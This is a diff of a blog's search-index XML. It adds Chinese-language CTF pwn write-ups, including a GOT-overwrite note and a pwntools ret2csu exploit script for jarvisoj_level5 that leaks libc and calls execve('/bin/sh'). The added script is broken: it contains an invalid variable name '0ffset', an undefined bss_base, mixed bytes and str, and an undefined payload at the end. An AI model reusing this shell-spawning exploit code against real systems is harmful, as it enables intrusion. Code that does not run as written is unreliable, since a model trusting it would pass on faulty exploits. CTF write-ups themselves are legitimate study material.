@@ -4049,7 +4049,8 @@ p.interactive()
   <entry>
     <title>hctf2016_fheap</title>
     <url>/2022/03/16/week3-2.1/</url>
-    <content><![CDATA[<html><head></head><body><p>​        第三周第二天第一道堆题。应该是一道中等偏下的fastbinattack。</p>
+    <content><![CDATA[<html><head></head><body><p>​    </p>
+<p>​        第三周第二天第一道堆题。应该是一道中等偏下的fastbinattack。</p>
 <p>​        libc是2.23。</p>
 <p>​        <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%881.17.22.png" data-caption="截屏2022-03-16 下午1.17.22" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%881.17.22.png" alt="截屏2022-03-16 下午1.17.22"></a></p>
 <p>​        保护全开，pie是个麻烦点。</p>
@@ -4120,9 +4121,10 @@ r.interactive()
       </tags>
   </entry>
   <entry>
-    <title>ccmc_pwnme2</title>
+    <title>week3-2.2</title>
     <url>/2022/03/16/week3-2.2/</url>
-    <content><![CDATA[<html><head></head><body><p>​        一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>
+    <content><![CDATA[<html><head></head><body><p>​    </p>
+<h4 id="ccmc-pwnme2">ccmc_pwnme2<a class="post-anchor" href="#ccmc-pwnme2"></a></h4><p>一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>
 <p>​        所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。</p>
 <pre><code class="python">from pwn import *
 p = remote('node4.buuoj.cn',27653)
@@ -4143,15 +4145,76 @@ p.interactive()
 </code></pre>
 <p>​    </p>
 <p>​    ps：感觉还需要再多做一些rop</p>
+<h4 id="PicoCTF-2018-got-shell">PicoCTF_2018_got-shell<a class="post-anchor" href="#PicoCTF-2018-got-shell"></a></h4><p>​        虽然但是，这个题为什么这么pwncollege。guide的风格，函数的名字。。。完全一致好吧。</p>
+<p>​        可以写4字节，正好可以修改got表为后门函数。那就修改puts咯？</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%889.16.16.png" data-caption="截屏2022-03-16 下午9.16.16" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%889.16.16.png" alt="截屏2022-03-16 下午9.16.16"></a></p>
+<p>​            美丽畅畅的暴击（只要我不尴尬，尴尬的就是。）</p>
+<h4 id="jarvisoj-level5">jarvisoj_level5<a class="post-anchor" href="#jarvisoj-level5"></a></h4><p>​        这个题吧，我好像以前做过，是个纯纯的ret2csu的板子题。</p>
+<pre><code class="python">from pwn import*
+from LibcSearcher import LibcSearcher
+
+context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+#libc = ELF("")
+elf = ELF("./level3_x64")
+p = process("./level3_x64")
+
+0ffset = 0x88#(test)
+
+
+csu_front_addr = 0x400690
+csu_end_addr = 0x4006AA
+
+puts_plt = elf.plt['puts']
+libc_start_main_got = elf.got['__libc_start_main']
+main = elf.symbols['main']
+
+write_got = elf.got['write']
+read_got = elf.got['read']
+main_addr = elf.symbols['main']
+
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdi=edi=r15d
+    # rsi=r14
+    # rdx=r13
+    payload = b'a' * offset 
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += 'a' * (offset - 0x48)
+    payload += p64(last)
+    p.send(payload)
+    sleep(1)
+
+csu(0, 1, write_got, 8, write_got, 1, main_addr)
+write_addr = u64(p.recv(8))
+
+libc = LibcSearcher('write', write_addr)
+libc_base = write_addr - libc.dump('write')
+execve_addr = libc_base + libc.dump('execve')
+log.success('execve_addr ' + hex(execve_addr))
+'''
+libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
+libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
+system_addr = libcbase + libc.dump('system')
+binsh_addr = libcbase + libc.dump('str_bin_sh')
+log.success('system_addr ' + hex(system_addr))
+'''
+csu(0, 1, read_got, 16, bss_base, 0, main_addr)
+p.send(p64(execve_addr) + '/bin/sh\x00')
+
+p.recvuntil('Hello, World\n')
+## execve(bss_base+8)
+csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
 </body></html>]]></content>
-      <tags>
-        <tag>week</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ccmc_pwnme2</title>
-    <url>/2022/03/16/week3-2.3/</url>
-    <content><![CDATA[]]></content>
       <tags>
         <tag>week</tag>
       </tags>
